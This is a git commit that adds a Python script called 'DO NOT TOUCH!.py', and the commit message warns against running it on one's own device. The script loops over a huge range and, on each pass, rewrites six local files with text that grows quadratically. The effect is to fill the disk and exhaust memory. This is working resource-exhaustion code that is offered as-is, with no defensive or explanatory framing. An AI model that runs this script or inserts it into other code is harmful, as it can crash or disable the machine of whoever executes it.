25a2c4675a4ce85c60b6cf38cf5072cac0e47ea1
darkstarshine2011 <150021527+darkstarshine2011@users.noreply.github.com>
2024-12-21 20:40:17 +0330

    ⚠️
    !! DO NOT run in your own device !!

---
+++ DO NOT TOUCH!.py
@@ -0,0 +1,33 @@
+#skill
+
+import os
+
+for i in range(3003, 2000000000000000002, 1001):
+
+    print(i)
+
+    File = open("skill I", "w")
+    File.write("#SKILL " * i * i)
+    File.close()
+
+    File = open("Skill II", "w")
+    File.write("#SKILL " * i * i)
+    File.close()
+
+    File = open("sKill III", "w")
+    File.write("#SKILL " * i * i)
+    File.close()
+
+    File = open("skIll IV", "w")
+    File.write("#SKILL " * i * i)
+    File.close()
+
+    File = open("skiLl V", "w")
+    File.write("#SKILL " * i * i)
+    File.close()
+
+    File = open("skilL VI", "w")
+    File.write("#SKILL " * i * i)
+    File.close()
+
+#skill
